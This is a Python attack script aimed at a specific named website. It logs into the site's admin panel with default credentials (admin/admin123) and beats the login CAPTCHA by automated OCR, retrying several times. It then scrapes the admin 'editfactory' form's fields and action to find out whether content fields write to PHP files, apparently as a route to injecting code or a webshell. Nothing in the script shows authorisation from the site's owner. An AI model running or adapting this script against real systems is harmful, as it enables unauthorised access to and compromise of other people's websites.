#!/usr/bin/env python3
"""gz: analyze editfactory form - check if content fields write to PHP files"""
import urllib.request, urllib.parse, re, http.cookiejar, base64, subprocess, sys

HOST = "http://gz-dichuan.com"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}

def ocr(img_bytes):
    b64 = base64.b64encode(img_bytes).decode()
    code = ("import ddddocr,base64; o=ddddocr.DdddOcr(show_ad=False); "
            "print(o.classification(base64.b64decode('%s')))" % b64)
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=20, cwd="/tmp")
    return r.stdout.decode().strip()

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def fetch(url, data=None, timeout=15, headers=None):
    h = {**UA, "Content-Type": "application/x-www-form-urlencoded"}
    if headers: h.update(headers)
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read()
    except urllib.error.HTTPError as e:
        return e.code, url, e.read()
    except Exception as ex:
        return 0, url, str(ex).encode()

for attempt in range(10):
    try:
        code, final, body = fetch(HOST + "/index.php?m=admin&c=login&a=index")
        code, final, cap = fetch(HOST + "/index.php?m=admin&c=login&a=vertify",
                                 headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index"})
        cap_text = ocr(cap)
        data = urllib.parse.urlencode({"username": "admin", "password": "admin123", "vertify": cap_text})
        code, final, resp = fetch(HOST + "/index.php?m=admin&c=login&a=login", data=data,
                                  headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index",
                                           "X-Requested-With": "XMLHttpRequest"})
        rt = resp.decode("utf-8", "ignore")
        if "登录成功" in rt or '"status":1' in rt:
            print("login ok")
            break
    except Exception:
        pass

# editfactory page - full form
code, final, body = fetch(HOST + "/index.php?m=admin&c=factory&a=editfactory&factory_id=1",
                          headers={"Referer": HOST + "/index.php?m=admin&c=factory&a=index"})
bt = body.decode("utf-8", "ignore")
open("/tmp/gz_editfactory1.html", "w").write(bt)
print("editfactory: %s size=%d" % (code, len(bt)))
# all inputs/textareas
for m in re.finditer(r'<(input|textarea|select)[^>]*name=["\']([^"\']+)["\'][^>]*>', bt, re.I):
    print("  field:", m.group(0)[:120])
# form action
m = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', bt, re.I)
print("  form action:", m.group(1) if m else "?")
# content/value of key fields
for f in ["factory_name", "factory_content", "content", "cat_desc", "intro"]:
    m = re.search(r'name=["\']%s["\'][^>]*value=["\']([^"\']*)["\']' % f, bt, re.I)
    if m: print("  %s = %s" % (f, m.group(1)[:60]))
    m2 = re.search(r'<textarea[^>]*name=["\']%s["\'][^>]*>(.*?)</textarea>' % f, bt, re.S | re.I)
    if m2: print("  %s(textarea) = %s" % (f, m2.group(1)[:80]))
